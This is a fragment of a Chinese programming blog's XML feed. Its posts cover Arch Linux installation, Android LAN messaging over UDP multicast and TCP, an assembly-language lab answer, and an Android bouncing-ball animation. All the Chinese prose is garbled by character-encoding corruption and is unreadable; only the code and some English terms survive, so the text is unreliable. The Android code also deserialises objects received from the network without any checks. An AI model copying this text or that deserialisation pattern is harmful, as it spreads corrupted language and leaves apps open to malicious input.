å®‰è£…åŽé…ç½®è™½ç„¶ç³»ç»Ÿå®‰è£…å¥½äº†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰è¿›è¡ŒåŸºæœ¬é…ç½®å’Œå®‰è£…å›¾å½¢ç•Œé¢ï¼Œæ‰€ä»¥æŽ¥ä¸‹æ¥æˆ‘ä»¬è¦è¿›è¡Œä¸€äº›å¿…é¡»çš„é…ç½®å’Œå›¾å½¢ç•Œé¢çš„å®‰è£…ã€‚ è¯·è§ä¸‹ä¸€ç¯‡æ–‡ç« ï¼šArchLinuxå®‰è£…åŽçš„å¿…é¡»é…ç½®ä¸Žå›¾å½¢ç•Œé¢å®‰è£…æ•™ç¨‹ ç‰¹åˆ«æ„Ÿè°¢è¯„è®ºåŒºä¸­Senrey_Songã€YKunã€imzhwkã€haonan maoã€Lichen Zhangå¯¹äºŽæœ¬æ•™ç¨‹å†…å®¹çš„æŒ‡æ­£ã€‚ leccesgé€šè¿‡é‚®ä»¶æä¾›çš„å®è´µå»ºè®®ã€‚ æœ€åŽå¦‚æžœè§‰å¾—è¿™ç¯‡æ•™ç¨‹å¯¹ä½ æœ‰å¸®åŠ©ï¼Œå¯ä»¥ç§»æ­¥æˆ‘çš„çŸ¥ä¹Žå›žç­”ï¼š Arch Linux æ€Žä¹ˆå®‰è£…ï¼Ÿ - viseatorçš„å›žç­” - çŸ¥ä¹Ž https://www.zhihu.com/question/21427410/answer/171867330 ä¸‹ç‚¹ä¸ªèµžï¼Œè®©æ›´å¤šçš„äººå¯ä»¥çœ‹åˆ°è¿™ç¯‡æ•™ç¨‹ï¼Œä½ çš„æ”¯æŒæ˜¯æˆ‘æœ€å¤§çš„åŠ¨åŠ›ã€‚ å¦‚æžœå®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥ç›´æŽ¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€æˆ–é‚®ä»¶viseator@gmail.comï¼ˆå°½é‡é™„ä¸Šé”™è¯¯ä¿¡æ¯ï¼‰ï¼Œæˆ‘ä¼šå°½åŠ›å›žå¤è§£å†³ã€‚]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Androidåˆ©ç”¨UDPã€TCPè¿›è¡Œå±€åŸŸç½‘æ•°æ®ä¼ è¾“]]></title>
    <url>%2F2017%2F05%2F11%2Fandroid_lan_messages%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢åœ¨å›¢é˜Ÿå†…éƒ¨çš„hackweekä¸­å®žçŽ°äº†ä¸€ä¸ªåœ¨å±€åŸŸç½‘çŽ¯å¢ƒä¸­ï¼ˆåŒä¸€ä¸ªwifiä¸‹ï¼‰è¿›è¡Œçš„å¡ç‰‡æ”¶å‘å°æ¸¸æˆï¼Œè¸©äº†ä¸€äº›å…³äºŽå±€åŸŸç½‘å†…é€šä¿¡çš„å‘ï¼Œè¿™ç¯‡åšæ–‡å°±ç”¨æ¥æ•´ç†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹çš„æ€è·¯ï¼Œå®Œæ•´ä»£ç åœ°å€ã€‚ å®žçŽ°æ€è·¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­åˆ©ç”¨åˆ°äº†UDPä¸ŽTCPä¸¤ç§ä¼ è¾“å±‚åè®®ï¼Œä¸¤è€…çš„ç‰¹æ€§å†³å®šäº†ä½¿ç”¨ä¸Šçš„ä¸åŒã€‚ ç®€å•åœ°è¯´ï¼ŒUDPéžé¢å‘è¿žæŽ¥ï¼Œä¸éœ€è¦å…ˆä¸Žç›®æ ‡å»ºç«‹è¿žæŽ¥ï¼Œæ‰€ä»¥UDPä¸æä¾›å¯é çš„æ•°æ®ä¼ è¾“ï¼Œä¹Ÿä¸èƒ½ä¿è¯æ•°æ®å‡†ç¡®æ— è¯¯åœ°åˆ°è¾¾ç›®çš„åœ°ï¼Œä½†UDPçš„ä¼˜åŠ¿åœ¨äºŽå®ƒå¯ä»¥è¿…é€Ÿä¼ é€å¤§é‡ä¿¡æ¯ï¼Œä¼ è¾“æ€§èƒ½æ¯”è¾ƒå¥½ã€‚ è€ŒTCPæ˜¯é¢å‘è¿žæŽ¥çš„åè®®ï¼Œéœ€è¦ç»è¿‡ä¸‰æ¬¡æ¡æ‰‹ä¸Žç›®çš„åœ°å€å»ºç«‹ä¸€ä¸ªç¨³å®šçš„è¿žæŽ¥ï¼Œå¯ä»¥ä¿è¯æ•°æ®å‡†ç¡®ã€å®Œæ•´åœ°åˆ°è¾¾ã€‚ä½†æ˜¯å®ƒçš„ä¼ è¾“æ•ˆçŽ‡å°±æ²¡æœ‰UDPé‚£ä¹ˆé«˜ã€‚ é¦–å…ˆï¼Œä¸ºäº†æ•°æ®ä¼ è¾“çš„ç¨³å®šå’Œå‡†ç¡®æ€§ï¼Œåœ¨ä¼ é€ä¸»è¦æ•°æ®éƒ¨åˆ†æˆ‘ä»¬å¿…éœ€ä½¿ç”¨TCPæ¥å»ºç«‹ä¸€ä¸ªç‚¹å¯¹ç‚¹çš„ç¨³å®šçš„è¿žæŽ¥æ¥ä¼ è¾“ä¸»è¦æ•°æ®ã€‚ ä½†æ˜¯ï¼Œä¸ºäº†å»ºç«‹ä¸€ä¸ªTCPè¿žæŽ¥ï¼Œè¯·æ±‚çš„ä¸€æ–¹å¿…é¡»è¦çŸ¥é“è¢«è¯·æ±‚ä¸€æ–¹ï¼ˆä¸‹é¢ç®€ç§°æœåŠ¡æ–¹ï¼‰çš„IPåœ°å€ã€‚è€Œåœ¨å±€åŸŸç½‘ä¸­ï¼Œå¦‚æžœæˆ‘ä»¬æƒ³è¦å®žçŽ°æ¯ä¸ªäººè¿žæŽ¥å±€åŸŸç½‘ä»¥åŽé©¬ä¸Šå¯ä»¥æ”¶å‘ä¿¡æ¯ï¼Œç”±äºŽæ¯æ¬¡åŠ å…¥æ—¶åˆ†é…åˆ°çš„IPåœ°å€å¹¶ä¸æ˜¯å›ºå®šçš„ä¹Ÿæ— æ³•æå‰å¾—çŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„åŠžæ³•å…ˆèŽ·å–åˆ°æœåŠ¡æ–¹çš„IPåœ°å€ã€‚ è¿™æ—¶å°±è¦åˆ©ç”¨åˆ°UDPåè®®çš„ç»„æ’­ç‰¹æ€§äº†ï¼Œç»„æ’­å¯ä»¥è®©è®¾å¤‡éƒ½åŠ å…¥ä¸€ä¸ªé¢„è®¾å¥½çš„ç»„ï¼Œç„¶åŽå°±å¯ä»¥å‘è¿™ä¸ªç»„ä¸­å‘é€æ•°æ®åŒ…ï¼Œåªè¦åŠ å…¥äº†è¿™ä¸ªç»„çš„è®¾å¤‡éƒ½å¯ä»¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…ã€‚è¿™æ ·åªè¦æ‰€æœ‰çš„è®¾å¤‡éƒ½æå‰åŠ å…¥äº†åŒä¸€ä¸ªç»„ï¼Œä¸éœ€è¦äº’ç›¸çŸ¥é“IPåœ°å€å°±å¯ä»¥äº¤æ¢æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•åˆ©ç”¨è¿™æ ·çš„ç‰¹æ€§å‘¢ï¼Ÿ ç»“åˆæˆ‘ä»¬çš„å®žé™…éœ€æ±‚ï¼Œæ¸¸æˆè¿‡ç¨‹æ˜¯æ¯ä¸ªäººå¯ä»¥å‘æ‰€æœ‰äººå‘é€ä¸€ä¸ªåªæœ‰æ ‡é¢˜çš„åŒ¿åå¡ç‰‡ï¼ˆè¿™ä¸ªè¿‡ç¨‹å°±ç¬¦åˆUDPç»„æ’­çš„ç‰¹æ€§ï¼‰ï¼Œå¦‚æžœæ„Ÿå…´è¶£çš„äººå°±å¯ä»¥ç‚¹å‡»æ”¶åˆ°çš„å¡ç‰‡æ¥æ‰“å¼€è¿™ä¸ªå¡ç‰‡æŸ¥çœ‹å…·ä½“å†…å®¹ï¼ˆè¿™ä¸ªè¿‡ç¨‹å°±éœ€è¦æˆ‘ä»¬å»ºç«‹TCPè¿žæŽ¥æ¥ä¼ è¾“æ•°æ®ï¼‰ã€‚ æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†æ€è·¯ï¼Œå‘æ‰€æœ‰äººå‘é€å¡ç‰‡çš„è¿‡ç¨‹ä½¿ç”¨UDPè¿›è¡Œç»„æ’­ï¼Œæ•°æ®åŒ…ä¸­é™¤äº†åŒ…å«æ ‡é¢˜ä¿¡æ¯è¿˜è¦åŒ…å«ä¸€ä¸ªå‘é€äººçš„IPåœ°å€ä»¥åŠä¸€ä¸ªMacåœ°å€ä½œä¸ºIDï¼ˆè€ƒè™‘åˆ°é‡æ–°è¿žæŽ¥åŽåœ°å€å‘ç”Ÿæ”¹å˜çš„é—®é¢˜ï¼‰ï¼Œå½“æ‰€æœ‰äººæ”¶åˆ°è¿™ä¸ªå¡ç‰‡ä»¥åŽéœ€è¦å»ºç«‹è¿žæŽ¥çš„æ—¶å€™å°±å¯ä»¥å¾—åˆ°å‘é€äººçš„IPæ¥è¿›è¡ŒTCPè¿žæŽ¥ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥å®žçŽ°è¿™ä¸ªè¿‡ç¨‹ã€‚ å…·ä½“å®žçŽ°ç»„æ’­æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªComUtilç±»æ¥å¤„ç†ç»„æ’­ åŠ å…¥ç»„12345678910111213public static final String CHARSET = "utf-8";private static final String BROADCAST_IP = "224.0.1.2"; //IPåè®®ä¸­ç‰¹æ®ŠIPåœ°å€ï¼Œä½œä¸ºä¸€ä¸ªç»„ï¼Œç”¨æ¥é›†åˆåŠ å…¥çš„æ‰€æœ‰å®¢æˆ·ç«¯public static final int BROADCAST_PORT = 7816; //å¹¿æ’­ç›®çš„ç«¯çš„ç«¯å£å·private static final int DATA_LEN = 4096;private MulticastSocket socket = null;private InetAddress broadcastAddress = null;//å½“å‰è®¾å¤‡åœ¨å±€åŸŸç½‘ä¸‹çš„IPåœ°å€byte[] inBuff = new byte[DATA_LEN];private DatagramPacket inPacket = new DatagramPacket(inBuff, inBuff.length);//ç”¨äºŽæŽ¥å—å¯¹è±¡çš„packetprivate DatagramPacket outPacket = null;//ç”¨äºŽå‘é€å¯¹è±¡çš„packetprivate Handler handler;public ComUtil(Handler handler) &#123; this.handler = handler;//å›žè°ƒä½¿ç”¨Handleræœºåˆ¶&#125; 12345678910111213public void startReceiveMsg() &#123; try &#123; socket = new MulticastSocket(BROADCAST_PORT);//æ‰“å¼€ä¸€ä¸ªç»„æ’­Socket broadcastAddress = InetAddress.getByName(BROADCAST_IP);//éœ€è¦è¿›è¡Œä¸€æ­¥è½¬æ¢æ¥ä½¿ç”¨Stringç±»åž‹çš„IPåœ°å€ socket.joinGroup(broadcastAddress);//åŠ å…¥ä¸€ä¸ªç»„ outPacket = new DatagramPacket(new byte[0], 0, broadcastAddress, BROADCAST_PORT);//ç”¨äºŽå‘é€æ•°æ®åŒ…çš„DatagramPacket &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; //ä¸‹é¢ä¸¤è¡Œç”¨äºŽä¸‹æ–‡ä¸­çš„å¼€å§‹æŽ¥æ”¶å¹¿æ’­ Thread thread = new Thread(new ReadBroad()); thread.start();&#125; æ³¨é‡Šåº”è¯¥è®²å¾—æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯UDPæ•°æ®çš„æ”¶å‘éœ€è¦ä½¿ç”¨ä¸€ä¸ªDatagramPacketæ¥è¿›è¡Œã€‚å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ•°æ®åŒ…ã€‚ æŽ¥æ”¶ç»„æ’­ä¿¡æ¯ä¸Šé¢çš„ä»£ç æœ€åŽä¸¤è¡Œæ–°å»ºäº†ä¸€ä¸ªçº¿ç¨‹ç”¨äºŽæŽ¥æ”¶ç»„æ’­ä¿¡æ¯ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415class ReadBroad implements Runnable &#123; public void run() &#123; while (true) &#123; try &#123; socket.receive(inPacket); Message message = new Message(); message.what = BROADCAST_PORT; message.obj = inBuff; handler.sendMessage(message); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; è¿›è¡Œäº†ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œè¿›è¡Œåˆ°ç¬¬5è¡Œæ—¶å¦‚æžœæ²¡æœ‰æ”¶åˆ°å¹¿æ’­çš„DatagramPacketä¼šä¸€ç›´å¤„äºŽé˜»å¡žçŠ¶æ€ï¼Œæ”¶åˆ°ä¸€ä¸ªDatagramPacketåŽå°±ä¼šé€šè¿‡Handleræ¥è½¬å‘å‡ºåŽ»ï¼Œåœ¨Handleræ‰€åœ¨çº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªæ•°æ®åŒ…ã€‚ä¹‹åŽå†è¿›è¡Œå¾ªçŽ¯ä¸æ–­åœ°æŽ¥æ”¶å¹¶å¤„ç†æ•°æ®åŒ…ã€‚ å‘é€ç»„æ’­ä¿¡æ¯123456789101112131415161718public void broadCast(final byte[] msg) &#123; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; outPacket.setData(msg); //æ•°æ®æ¥æºä¸ºå¤–éƒ¨ï¼Œç±»åž‹æ˜¯äºŒè¿›åˆ¶æ•°æ® socket.send(outPacket);//å‘ç»„ä¸­å‘é€è¯¥æ•°æ®åŒ… &#125; catch (IOException ex) &#123; ex.printStackTrace(); if (socket != null) &#123; socket.close(); &#125; &#125; &#125; &#125;); thread.start();&#125; è¿™ä¸ªæ–¹æ³•ç”±å¤–éƒ¨è°ƒç”¨ï¼Œä¼ å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ•°ç»„æ•°æ®é€šè¿‡setData()æ”¾åœ¨æ•°æ®åŒ…ä¸­å‘ç»„ä¸­çš„æ‰€æœ‰æˆå‘˜å‘é€ã€‚æˆå‘˜é€šè¿‡ä¸Šä¸€èŠ‚çš„æŽ¥æ”¶æ–¹æ³•æŽ¥æ”¶åˆ°çš„å°±ä¼šæ˜¯åŒæ ·çš„æ•°æ®åŒ…ã€‚ æ•°æ®å¤„ç†å»ºç«‹äº†ç»„æ’­çš„å·¥å…·ï¼Œä¸‹ä¸€æ­¥å°±è¦å»ºç«‹ä¸€ä¸ªæ•°æ®å¯¹è±¡æ¥è¿›è¡Œä¿¡æ¯çš„äº¤æ¢ã€‚ç”±äºŽæ•°æ®åŒ…ä¸­çš„æ•°æ®åªèƒ½æ˜¯ä»¥å­—èŠ‚ç çš„å½¢å¼å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾è®¡çš„æ•°æ®å¯¹è±¡ä¸€å®šè¦æ˜¯å¯åºåˆ—åŒ–çš„ï¼ˆä¹Ÿå°±æ˜¯å®žçŽ°äº†SerializableæŽ¥å£çš„ï¼‰ï¼Œå†é€šè¿‡æµå·¥å…·è¿›è¡Œè½¬æ¢ã€‚ 1234567public class UDPDataPackage implements Serializable &#123; private String ipAddress; private String macAddress; private String title; private String id; ...&#125; åœ¨è¿™ä¸ªç®€å•çš„JavaBeanä¸­åªå®šä¹‰äº†å››ä¸ªç®€å•æ•°æ®ã€‚ æˆ‘ä»¬å°†è‡ªå·±çš„ä¿¡æ¯è®¾ç½®åŽå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•è½¬æ¢æˆä¸€ä¸ªå­—èŠ‚æ•°ç»„å†é€šè¿‡ä¸Šé¢çš„å¹¿æ’­æ–¹æ³•æ¥å‘é€ï¼š 1comUtil.broadCast(ConvertData.objectToByte(new UDPDataPackage(...))); //å‘é€æ•°æ® 123456789101112//é€šè¿‡æµæ¥è¿›è¡Œçš„åºåˆ—åŒ–public static byte[] objectToByte(Object object) &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream; try &#123; outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(object); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return byteArrayOutputStream.toByteArray();&#125; åŒæ ·çš„ï¼Œåœ¨æŽ¥æ”¶åˆ°æ•°æ®ä»¥åŽå¯ä»¥ååºåˆ—åŒ–æ¥å¾—åˆ°åŽŸå¯¹è±¡ï¼š 1234567891011public static Object byteToObject(byte[] bytes) &#123; ByteArrayInputStream byteInputStream = new ByteArrayInputStream(bytes); Object object = null; try &#123; ObjectInputStream objectInputStream = new ObjectInputStream(byteInputStream); object = objectInputStream.readObject(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return object;&#125; è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»Žè¿™ä¸ªå¯¹è±¡ä¸­èŽ·å–æƒ³åˆ°çš„IPåœ°å€ç­‰ä¿¡æ¯äº†ã€‚ å»ºç«‹TCPè¿žæŽ¥ä¼ è¾“æ•°æ®æƒ³è¦å»ºç«‹TCPè¿žæŽ¥ï¼Œéœ€è¦å®¢æˆ·ç«¯ä¸ŽæœåŠ¡ç«¯ä¸¤ç«¯çš„é…åˆï¼Œæˆ‘ä»¬çŽ°åœ¨å·²ç»èŽ·å–åˆ°äº†éœ€è¦å»ºç«‹è¿žæŽ¥çš„IPåœ°å€ï¼Œä¸‹é¢æˆ‘ä»¬è¦åšçš„æ˜¯ä¸Žè¿™ä¸ªåœ°å€çš„æœåŠ¡ç«¯å»ºç«‹è¿žæŽ¥å†ä¼ è¾“æ•°æ®ã€‚æœåŠ¡ç«¯éœ€è¦ä¸€ç›´è¿è¡Œæ¥éšæ—¶å‡†å¤‡æŽ¥å—å¯èƒ½çš„è¯·æ±‚ã€‚ ç”±äºŽæˆ‘ä»¬åŒä¸€ä¸ªè®¾å¤‡æ—¢è¦ä½œä¸ºå®¢æˆ·ç«¯ï¼Œä¹Ÿè¦ä½œä¸ºæœåŠ¡ç«¯ï¼Œæ‰€ä»¥è¦ç¼–å†™ä¸¤ä¸ªç±»ã€‚ æœåŠ¡ç«¯12345public void startServer(Handler handler) &#123; this.handler = handler;//åˆ©ç”¨handlerè¿›è¡Œå¤„ç† thread = new Thread(new RunServer()); thread.start();//å¦å¼€ä¸€ä¸ªçº¿ç¨‹æŽ¥æ”¶è¿žæŽ¥è¯·æ±‚&#125; 1234567891011121314151617181920212223242526272829303132333435class RunServer implements Runnable &#123; @Override public void run() &#123; ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket();//åˆå§‹åŒ–ä¸€ä¸ªServerSocket serverSocket.setReuseAddress(true); serverSocket.bind(new InetSocketAddress(SERVER_PORT));//ä¸Žç«¯å£ç»‘å®š &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; while (true) &#123; try &#123; Socket socket = serverSocket.accept();//åˆ©ç”¨acceptæ–¹æ³•èŽ·å¾—socket InputStream inputStream; inputStream = socket.getInputStream();//èŽ·å–è¾“å…¥æµï¼ˆæ¥æºè‡ªå®¢æˆ·ç«¯ï¼‰ ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);//è½¬æ¢ä¸ºå¯¹è±¡è¾“å…¥æµ //èŽ·å–udpDataPackageå¯¹è±¡ UDPDataPackage udpDataPackage = (UDPDataPackage) objectInputStream.readObject(); OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//å°†æ•°æ®åŒ…å†™å…¥è¾“å‡ºæµä¼ é€ç»™å®¢æˆ·ç«¯ objectOutputStream.flush();//åˆ·æ–°æµ objectOutputStream.close(); outputStream.close(); objectInputStream.close(); inputStream.close(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; è§£é‡Šè§æ³¨é‡Šã€‚ å®¢æˆ·ç«¯1234567public void sendRequest(String ipAddress, UDPDataPackage udpDataPackage, Handler handler) &#123; this.ipAddress = ipAddress;//å³ä¸ºä¹‹å‰èŽ·å–åˆ°çš„IPåœ°å€ this.udpDataPackage = udpDataPackage; this.handler = handler; thread = new Thread(new SendData()); thread.start();&#125; 12345678910111213141516171819202122232425262728293031323334class SendData implements Runnable &#123; @Override public void run() &#123; Socket socket = null; try &#123; socket = new Socket(ipAddress, SERVER_PORT);//æ–°å»ºä¸€ä¸ªsocket socket.setReuseAddress(true); socket.setKeepAlive(true);//è®¾ç½®socketå±žæ€§ socket.setSoTimeout(5000);//è®¾ç½®è¶…æ—¶ //èŽ·å¾—ä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµ OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//å°†è¯·æ±‚åŒ…å†™å…¥è¾“å‡ºæµï¼ˆä¼ é€ç»™æœåŠ¡ç«¯ï¼‰ //èŽ·å–æœåŠ¡ç«¯è¿”å›žçš„æµ InputStream inputStream = socket.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); udpDataPackage dataPackage = (udpDataPackage) objectInputStream.readObject();//èŽ·å–åˆ°è¿”å›žçš„æ•°æ®å¯¹è±¡ //è½¬å‘ç»™handlerè¿›è¡Œå¤„ç† Message msg = new Message(); msg.what = SERVER_PORT; msg.obj = dataPackage; handler.sendMessage(msg); &#125; catch (SocketTimeoutException e) &#123; try &#123; if (socket != null) socket.close(); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; sendRequest(ipAddress, udpDataPackage, handler); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125; è§£é‡Šè§æ³¨é‡Šã€‚ å¯ä»¥çœ‹è§TCPè¿žæŽ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè®¾ç½®å¥½socketå¹¶èŽ·å–åˆ°è¾“å…¥è¾“å‡ºæµä»¥åŽå°±å¯ä»¥æŠŠæœåŠ¡ç«¯å½“ä½œæœ¬åœ°æµä¸€æ ·æ“ä½œï¼Œå…·ä½“çš„ç½‘ç»œé€šä¿¡å®žçŽ°è¿‡ç¨‹è¢«éšè—äº†ï¼Œæœ‰äº†æµä»¥åŽå°±å¯ä»¥è¿›è¡Œæ‰€æœ‰èƒ½å¯¹æµè¿›è¡Œçš„æ“ä½œäº†ã€‚åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è¦å®žçŽ°çš„å±€åŸŸç½‘æ•°æ®ä¼ è¾“å·²ç»å®Œæˆäº†ã€‚]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çŽ‹çˆ½æ±‡ç¼–è¯­è¨€ç¬¬ä¸‰ç‰ˆå®žéªŒ9 åŒå¾ªçŽ¯å®žçŽ°]]></title>
    <url>%2F2017%2F04%2F10%2Fassembly_wang_lab_9%2F</url>
    <content type="text"><![CDATA[ç¼–ç¨‹ï¼šåœ¨å±å¹•ä¸­é—´åˆ†åˆ«æ˜¾ç¤ºç»¿è‰²ã€ç»¿åº•çº¢è‰²ã€ç™½åº•è“è‰²çš„å­—ç¬¦ä¸²welcome to masm!ã€‚ æ•ˆæžœå›¾ï¼š é‡‡ç”¨äº†åŒå¾ªçŽ¯åµŒå¥—çš„å†™æ³•ï¼Œå¤–å±‚æŽ§åˆ¶è¾“å‡ºè¡Œæ•°ï¼Œå†…å±‚é€å­—ç¬¦è¯»å–ASCIIç ä¸Žå¯¹åº”è¡Œçš„å±žæ€§ã€‚ æŠŠloop s1æ”¹ä¸ºloop s2æœ‰æƒŠå–œå“¦ æ‰€æœ‰å®žéªŒç­”æ¡ˆåœ¨è¿™é‡Œ 123456789101112131415161718192021222324252627282930313233343536373839assume cs:code,ss:datacode segment mov ax,0b800h mov ds,ax mov bx,1760 mov ax,data mov ss,ax mov si,0 mov bp,0 mov cx,3s1: mov ss:[19],cx mov si,0 mov cx,16s2: mov di,si add di,di mov al,ss:[si] mov [bx+64+di],al mov al,ss:[16+bp] mov [bx+65+di],al inc si loop s2 inc bp add bx,160 mov cx,ss:[19] loop s1 mov ax,4c00h int 21hcode endsdata segment db &apos;welcome to masm!&apos; db 00000010b,00100100b,01110001b dw 0data endsend]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android PropertyAnimation å±žæ€§åŠ¨ç”»ï¼ˆäºŒï¼‰å¼¹è·³å°çƒå®žä¾‹]]></title>
    <url>%2F2017%2F04%2F02%2Fandroid_property_animation_2%2F</url>
    <content type="text"><![CDATA[å‰è¨€GitHubå®Œæ•´ä»£ç  ä¸Šç¯‡åšå®¢ç®€å•ä»‹ç»äº†å±žæ€§åŠ¨ç”»çš„åŽŸç†ï¼Œè¿™ç¯‡åšå®¢å°†ä¼šä»¥ä¸€ä¸ªç®€å•çš„å®žä¾‹æ¥è¿ç”¨ä¸Šä¹‹å‰è®²çš„å†…å®¹ï¼Œå¹¶å¯¹Animatorçš„å‡ ä¸ªå›žè°ƒæ–¹æ³•è¿›è¡Œè®²è§£ã€‚ ç›®æ ‡æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªViewï¼Œåœ¨ç”»å¸ƒä¸Šç»˜åˆ¶ä¸€ä¸ªå°çƒï¼Œç‚¹å‡»å±å¹•åŽå°çƒä»Žé¡¶éƒ¨è‡ªç”±ä¸‹è½ï¼Œè½åˆ°åº•è¾¹åŽåå¼¹ï¼Œåå¼¹æŸå¤±ä¸€åŠçš„èƒ½é‡ï¼Œä¹Ÿå°±æ˜¯è¯´å°çƒåªèƒ½ä¸Šå‡åˆ°ä¸‹è½æ—¶ä¸€åŠçš„é«˜åº¦ï¼Œå†é‡å¤è¿™ä¸ªè¿‡ç¨‹ç›´åˆ°é€€å‡ºç¨‹åºã€‚å¦‚å›¾ï¼š åˆ›å»ºè‡ªå®šä¹‰Viewé¦–å…ˆæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰Viewï¼Œè¿™é‡Œæˆ‘å°±é‡‡ç”¨ç»§æ‰¿LinearLayoutçš„æ–¹å¼æ¥åˆ›å»ºè¿™ä¸ªViewï¼Œä½†è¦æ³¨æ„LinearLayouté»˜è®¤æ˜¯ä¸ç»˜åˆ¶è‡ªèº«çš„ï¼Œéœ€è¦åœ¨onDraw()æ–¹æ³•ä¹‹å‰é€‚å½“çš„æ—¶å€™è°ƒç”¨setWillNotDraw(false);ä»¤å…¶è¿›è¡Œç»˜åˆ¶ã€‚ åœ¨ç»§æ‰¿LinearLayoutçš„åŒæ—¶æˆ‘ä»¬è¦å®žçŽ°å…¨éƒ¨ä¸‰ä¸ªæž„é€ æ–¹æ³•ï¼Œå¦åˆ™xmlæ–‡ä»¶çš„é¢„è§ˆè§£æžä¼šå‡ºçŽ°é—®é¢˜ï¼š 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; åˆ›å»ºå¥½è‡ªå®šä¹‰ViewåŽï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å¯¹åº”çš„layout xmlå¸ƒå±€æ–‡ä»¶ä¸­ç”¨å®Œæ•´åŒ…å+ç±»åçš„æ–¹å¼ä½¿ç”¨æˆ‘ä»¬çš„è‡ªå®šä¹‰Viewï¼š 1234&lt;com.viseator.viewtest.VView android:layout_width="match_parent" android:layout_height="match_parent" /&gt; åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨ç»˜åˆ¶ä¹‹å‰çš„onMeasure()æ–¹æ³•ä¸­è°ƒç”¨setWillNotDraw(false);ä½¿è‡ªå®šä¹‰Viewå¯ä»¥ç»˜åˆ¶ï¼š 123456@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setWillNotDraw(false); setOnClickListener(this); super.onMeasure(widthMeasureSpec, heightMeasureSpec);&#125; è¿™é‡Œä¹Ÿè°ƒç”¨äº†setOnClickListener()æ³¨å†Œä¹‹åŽçš„ç‚¹å‡»äº‹ä»¶ã€‚ ç»˜åˆ¶å°çƒçš„ç»˜åˆ¶1234567891011121314151617181920private ValueAnimator animator;public static final int radius = 50;private int xPos = radius;private int yPos = radius;private Paint paint = new Paint();@Overrideprotected void onDraw(Canvas canvas) &#123; super.onDraw(canvas); if (animator == null) &#123; canvasHeight = canvas.getHeight() - radius; paint.setColor(getResources().getColor(R.color.Gray)); paint.setAntiAlias(true); &#125; drawCircle(canvas);&#125;void drawCircle(Canvas canvas) &#123; canvas.drawCircle(xPos, yPos, radius, paint);&#125; è¿™é‡Œç¬¬10è¡Œå¯¹æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡ç»˜åˆ¶è¿›è¡Œåˆ¤æ–­å¹¶å°†ç”»å¸ƒå¤§å°ä¿å­˜åˆ°canvasHeightä¾›ä¹‹åŽçš„ç»˜åˆ¶ä½¿ç”¨ï¼ˆä¹‹åŽçš„ç»˜åˆ¶çš„åæ ‡éœ€è¦ç›¸å¯¹äºŽç”»å¸ƒçš„åæ ‡ï¼‰å¹¶è®¾ç½®paintçš„å±žæ€§ã€‚ 